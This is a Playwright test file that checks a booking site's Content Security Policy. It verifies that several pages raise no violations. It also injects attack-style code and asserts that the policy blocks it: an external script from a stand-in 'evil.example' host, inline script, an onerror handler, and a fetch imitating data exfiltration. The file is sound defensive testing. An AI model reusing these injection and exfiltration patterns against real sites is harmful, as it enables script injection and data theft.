// The browser enforces the Content Security Policy, so only a real browser can prove the pages still work under it.
const { test, expect } = require('@playwright/test');
const h = require('./helpers');

test.beforeEach(async ({ request }) => { await h.reset(request); });

for (const path of ['/', '/charters', '/bookings', '/success', '/canceled', '/not-a-real-page', '/dashboard']) {
    test(`${path}: nothing is blocked by the security policy and nothing throws`, async ({ page }) => {
        const problems = h.watch(page);
        await page.addInitScript(() => { window.__violations = []; document.addEventListener('securitypolicyviolation', (e) => window.__violations.push(`${e.violatedDirective} blocked ${e.blockedURI}`)); });
        await page.goto(path);
        await page.waitForLoadState('networkidle').catch(() => {});
        await page.evaluate(async () => { for (let y = 0; y < document.body.scrollHeight; y += 500) { window.scrollTo(0, y); await new Promise((r) => setTimeout(r, 80)); } });
        expect(await page.evaluate(() => window.__violations)).toEqual([]);
        expect(problems).toEqual([]);
    });
}

test('the policy stops injected code: a script from another site, inline code, and an inline event handler', async ({ page }) => {
    await page.addInitScript(() => { window.__violations = []; document.addEventListener('securitypolicyviolation', (e) => window.__violations.push(`${e.violatedDirective} blocked ${e.blockedURI}`)); });
    await page.goto('/bookings');
    await page.waitForSelector('.react-calendar');
    const result = await page.evaluate(async () => {
        const external = document.createElement('script'); external.src = 'https://evil.example/steal.js'; document.body.appendChild(external);
        const inline = document.createElement('script'); inline.textContent = 'window.__ranInline = true'; document.body.appendChild(inline);
        const image = document.createElement('img'); image.src = 'x'; image.setAttribute('onerror', 'window.__ranHandler = true'); document.body.appendChild(image);
        let sentData = true; try { await fetch('https://evil.example/collect', { mode: 'no-cors' }); } catch { sentData = false; }
        await new Promise((r) => setTimeout(r, 800));
        return { ranInline: Boolean(window.__ranInline), ranHandler: Boolean(window.__ranHandler), sentData, violations: window.__violations };
    });
    expect(result.ranInline).toBe(false);
    expect(result.ranHandler).toBe(false);
    expect(result.sentData).toBe(false);
    expect(result.violations.join(' ')).toMatch(/script-src.*evil\.example/);
});
